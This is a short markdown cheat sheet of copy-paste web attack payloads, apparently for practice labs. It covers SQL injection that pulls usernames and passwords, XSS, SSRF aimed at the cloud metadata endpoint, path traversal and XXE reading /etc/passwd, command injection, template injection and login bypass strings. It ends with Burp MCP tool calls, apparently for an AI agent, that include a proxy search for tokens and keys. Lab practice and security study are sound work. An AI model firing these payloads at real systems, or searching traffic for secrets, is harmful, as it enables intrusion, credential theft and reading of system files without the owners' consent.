# Lab Quick Solutions - Copy Paste Ready

## SQLi Quick Payloads
```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT @@version,NULL--          # MySQL
' UNION SELECT BANNER,NULL FROM v$version--  # Oracle
' || pg_sleep(10)--                       # PostgreSQL time
' AND 1=1--                               # Boolean true
' AND 1=2--                               # Boolean false
```

## XSS Quick Payloads
```html
<script>alert(1)</script>
'-alert(1)-'
javascript:alert(1)
#<img src=x onerror=alert(1)>
```

## SSRF Quick Payloads
```
http://127.1
http://0x7f000001
http://127.1/%2561dmin
http://169.254.169.254/latest/meta-data/
```

## Path Traversal Quick Payloads
```
../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd
```

## Command Injection Quick Payloads
```
|whoami
;whoami
`whoami`
$(whoami)
```

## XXE Quick Payload
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

## SSTI Quick Payloads
```
{{7*7}}       # Jinja2/Twig
${7*7}        # Freemarker
<%= 7*7 %>   # ERB
```

## Auth Bypass Quick
```
admin' OR '1'='1
admin'--
Cookie: Admin=true
```

## Race Condition Quick
```
# Send 20 concurrent POST requests
# Apply coupon/discount multiple times
```

## Burp MCP Quick Commands
```
burp(action="send", url="TARGET")
burp(action="collaborator_generate")
burp(action="collaborator_check")
burp(action="scanner_issues")
burp(action="proxy_search", regex="token|key")
burp(action="set_intercept", enabled=False)
```
